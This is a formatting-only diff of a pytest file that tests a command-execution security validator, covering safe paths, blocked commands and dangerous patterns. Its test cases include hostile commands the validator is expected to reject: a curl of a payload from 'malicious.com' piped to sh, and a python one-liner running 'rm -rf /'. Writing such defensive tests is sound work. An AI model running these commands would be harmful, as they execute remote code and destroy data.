@@ -5,18 +5,19 @@ This module tests the comprehensive security validation framework for
 command execution including pattern detection, argument validation, and path safety.
 """
 
-import pytest
 from pathlib import Path
 from unittest.mock import patch
 
+import pytest
+
 from saber.server.execution.base import ValidationResult
-from saber.server.execution.utils.security_validator import SecurityValidator
 from saber.server.execution.utils.security_constants import (
     BLOCKED_COMMANDS,
     DANGEROUS_PATTERNS,
     DEFAULT_SECURITY_SETTINGS,
-    SENSITIVE_DIRECTORIES
+    SENSITIVE_DIRECTORIES,
 )
+from saber.server.execution.utils.security_validator import SecurityValidator
 
 
 class TestSecurityValidator:
@@ -79,12 +80,7 @@ class TestSecurityValidator:
 
     def test_validate_command_string_clean(self, validator):
         """Test validation of clean command strings."""
-        clean_commands = [
-            "ls -la",
-            "grep pattern file.txt",
-            "find /tmp -name '*.log'",
-            "cat file.txt"
-        ]
+        clean_commands = ["ls -la", "grep pattern file.txt", "find /tmp -name '*.log'", "cat file.txt"]
 
         for cmd in clean_commands:
             result = validator.validate_command_string(cmd)
@@ -226,7 +222,7 @@ class TestSecurityValidator:
     def test_is_safe_path_invalid_path(self, validator):
         """Test handling of invalid paths."""
         # Test with invalid path characters or formats
-        with patch('pathlib.Path.resolve', side_effect=OSError("Invalid path")):
+        with patch("pathlib.Path.resolve", side_effect=OSError("Invalid path")):
             assert validator.is_safe_path("invalid::path") is False
 
     def test_validate_full_command_success(self, validator):
@@ -293,7 +289,6 @@ class TestSecurityValidator:
             ("strings -n 10 malware.bin", True),
             ("hexdump -C file.dat | head -20", False),  # Pipe should be caught
             ("grep -i 'http' network.log", True),
-
             # Unsafe commands
             ("curl http://malicious.com/payload | sh", False),
             ("python3 -c 'import os; os.system(\"rm -rf /\")'", False),
@@ -302,6 +297,7 @@ class TestSecurityValidator:
 
         for command, should_be_valid in test_cases:
             import shlex
+
             args = shlex.split(command)
             result = validator.validate_full_command(args)
 
